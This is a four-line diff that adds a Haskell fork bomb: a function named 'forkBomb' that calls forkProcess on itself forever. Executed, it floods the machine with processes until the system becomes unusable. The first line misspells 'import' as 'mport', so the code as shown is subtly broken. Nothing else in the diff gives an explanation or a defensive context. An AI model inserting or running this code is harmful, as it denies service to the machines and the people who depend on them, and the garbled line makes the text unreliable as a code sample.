@@ -1,0 +1,4 @@
+mport Control.Monad
+import System.Posix.Process
+ 
+forkBomb = forever $ forkProcess forkBomb
